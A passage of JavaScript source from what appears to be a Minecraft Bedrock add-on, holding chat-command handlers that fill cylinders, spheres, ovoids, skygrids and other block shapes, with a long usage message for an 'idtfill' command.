                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderyz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxyz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hourglass":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "cube":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            default:
                        }
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^idtfill$/):
                {
                    eventData.cancel = true;
                    eventData.cancel = true;
                    if (switchTestB.trim().split(" ").length == 1) {
                        player.sendMessage(`idtfill command format: 
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> <tileName: Block> [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> clear [clearContainers: boolean]
${command.dp}idtfill <from: x y z> <to: x y z> <integrity: float> drain
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`);
                    }
                    else {
                        let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsb = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "presetText", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsd = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsf = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsh = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "number", "string", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsj = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsl = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsn = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        //console.warn(argsh.args)
                        let args = argsa.args;
                        let argsc = argsb.args;
                        let argse = argsd.args;
                        let argsg = argsf.args;
                        let argsi = argsh.args;
                        let argsk = argsj.args;
                        let argsm = argsl.args;
                        let argso = argsn.args;
                        let argsaextra = argsa.extra;
                        let argsbextra = argsb.extra;
                        let argsdextra = argsd.extra;
                        let argsfextra = argsf.extra;
                        let argshextra = argsh.extra;
                        let argsjextra = argsj.extra;
                        let argslextra = argsl.extra;
                        let argsnextra = argsn.extra;
                        //console.warn(JSONStringify(args), JSONStringify(argsaextra))
                        let center = evaluateCoordinates(argsc[1], argsc[2], argsc[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        let cintegrity = argsc[4];
                        let radius = argsc[5];
                        let axis = argsc[6];
                        let cfirstblockname = argsc[7];
                        let cfirstblockstates = argsc[8];
                        let cmode = argsc[9];
                        let clastblockname = argsc[10];
                        let clastblockstates = argsc[11];
                        let creplacemode = argsc[12] ?? false;
                        let ccfirstblockname = argse[6];
                        let ccfirstblockstates = argse[7];
                        let ccmode = argse[8];
                        let cclastblockname = argse[9];
                        let cclastblockstates = argse[10];
                        let ccreplacemode = argse[11] ?? false;
                        let thickness = argsg[6];
                        let hsfirstblockname = argsg[7];
                        let hsfirstblockstates = argsg[8];
                        let hsmode = argsg[9];
                        let hslastblockname = argsg[10];
                        let hslastblockstates = argsg[11];
                        let hsreplacemode = argsg[12] ?? false;
                        let tintegrity = argsi[4];
                        let taxis = argsi[7];
                        let tfirstblockname = argsi[8];
                        let tfirstblockstates = argsi[9];
                        let tmode = argsi[10];
                        let tlastblockname = argsi[11];
                        let tlastblockstates = argsi[12];
                        let treplacemode = argsi[13] ?? false;
                        let sgskygridsize = argso[8];
                        let sgfirstblockname = argso[9];
                        let sgfirstblockstates = argso[10];
                        let sgmode = argso[11];
                        let sglastblockname = argso[12];
                        let sglastblockstates = argso[13];
                        let sgreplacemode = argso[14] ?? false;
                        let circlemode = false;
                        new Date(Date.now()).getMilliseconds();
                        let ccirclemode = false;
                        let hspheremode = false;
                        let tunnelmode = false;
                        let ovoidmode = false;
                        let hovoidmode = false;
                        let skygridmode = false;
                        if (["circle"].includes(fillmodetypeenum[argsc[9] ?? "undefined"?.toLowerCase()?.trim()])) {
                            circlemode = true;
                        }
                        if (["circlex", "circley", "circlez", "circlexy", "circleyz", "circlexz", "circlexyz", "sphere", "semisphere"].includes(fillmodetypeenum[argse[8] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ccirclemode = true;
                        }
                        if (["hollowsphere", "cylinderx", "cylindery", "cylinderz", "cylinderxy", "cylinderyz", "cylinderxz", "cylinderxyz", "dome"].includes(fillmodetypeenum[argsg[9] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hspheremode = true;
                        }
                        if (["tunnel", "cylinder"].includes(fillmodetypeenum[argsi[10] ?? "undefined"?.toLowerCase()?.trim()])) {
                            tunnelmode = true;
                        }
                        if (["ovoid"].includes(fillmodetypeenum[argsm[13] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ovoidmode = true;
                        }
                        if (["hollowovoid"].includes(fillmodetypeenum[argsk[14] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hovoidmode = true;
                        }
                        if (["skygrid", "inverseskygrid"].includes(fillmodetypeenum[argso[11] ?? "undefined"?.toLowerCase()?.trim()])) {
                            skygridmode = true;
                        }
                        let coordinatesa; /*
                        console.warn(circlemode, ccirclemode, hspheremode)*/
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesa = evaluateCoordinates(args[1], args[2], args[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let coordinatesb;
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesb = evaluateCoordinates(args[4], args[5], args[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let horadi;
                        let hooffset;
                        let hointegrity = argsk[9];
                        let hothickness = argsk[10];
                        let hofirstblockname = argsk[11];
                        let hofirstblockstates = argsk[12];
                        let homode = argsk[13];
                        let holastblockname = argsk[14];
                        let holastblockstates = argsk[15];
                        let horeplacemode = argsk[16] ?? false;
                        if ((hovoidmode)) {
                            horadi = evaluateCoordinates(argsk[4], argsk[5], argsk[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            hooffset = evaluateCoordinates(argsk[7], argsk[8], argsk[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let oradi;
                        let ooffset;
                        let ointegrity = argsk[9];
                        let ofirstblockname = argsm[10];
                        let ofirstblockstates = argsm[11];
                        let omode = argsm[12];
                        let olastblockname = argsm[13];
                        let olastblockstates = argsm[14];
                        let oreplacemode = argsm[15] ?? false;
                        if ((ovoidmode)) {
                            oradi = evaluateCoordinates(argsm[4], argsm[5], argsm[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            ooffset = evaluateCoordinates(argsm[7], argsm[8], argsm[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let integrity = args[7];
                        let firstblockname = args[8];
                        let firstblockstates = args[9];
                        let mode = args[10];
                        let lastblockname = args[11];
                        let lastblockstates = args[12];
                        let replacemode = args[13] ?? false;
                        let matchingblock = (lastblockname ?? "") == "" ? [undefined, undefined] : (lastblockname == "keep" || mode == "keep") ? ["air"] : [lastblockname, lastblockstates];
                        let cmatchingblock = (clastblockname ?? "") == "" ? [undefined, undefined] : (clastblockname == "keep") ? ["air"] : [clastblockname, clastblockstates];
                        let ccmatchingblock = (cclastblockname ?? "") == "" ? [undefined, undefined] : (cclastblockname == "keep") ? ["air"] : [cclastblockname, cclastblockstates];
                        let hsmatchingblock = (hslastblockname ?? "") == "" ? [undefined, undefined] : (hslastblockname == "keep") ? ["air"] : [hslastblockname, hslastblockstates];
                        let tmatchingblock = (tlastblockname ?? "") == "" ? [undefined, undefined] : (tlastblockname == "keep") ? ["air"] : [tlastblockname, tlastblockstates];
                        let omatchingblock = (olastblockname ?? "") == "" ? [undefined, undefined] : (olastblockname == "keep") ? ["air"] : [olastblockname, olastblockstates];
                        let homatchingblock = (holastblockname ?? "") == "" ? [undefined, undefined] : (holastblockname == "keep") ? ["air"] : [holastblockname, holastblockstates];
                        let sgmatchingblock = (sglastblockname ?? "") == "" ? [undefined, undefined] : (sglastblockname == "keep") ? ["air"] : [sglastblockname, sglastblockstates]; /*
                        console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                        switch (fillmodetypeenum[skygridmode ? sgmode : hovoidmode ? homode : ovoidmode ? omode : tunnelmode ? tmode : hspheremode ? hsmode : circlemode ? cmode : ccirclemode ? ccmode : mode ?? ""]) {
                            case "":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "replace":
                                system.run(() => {
                                    let ta;
                                    try {
                                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                        system.runTimeout(() => {
                                            try {
                                                let startTime = Date.now();
                                                if (replacemode) {
                                                    clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                                }
                                                ;
                                                let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                                let endTime = Date.now();
                                                player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                            }
                                            catch (e) {
                                                eventData.sender.sendMessage("§c" + e + e.stack);
                                            }
                                            finally {
                                                ta?.remove();
                                            }
                                        }, 2);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                });
                                break;
                            case "clear":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
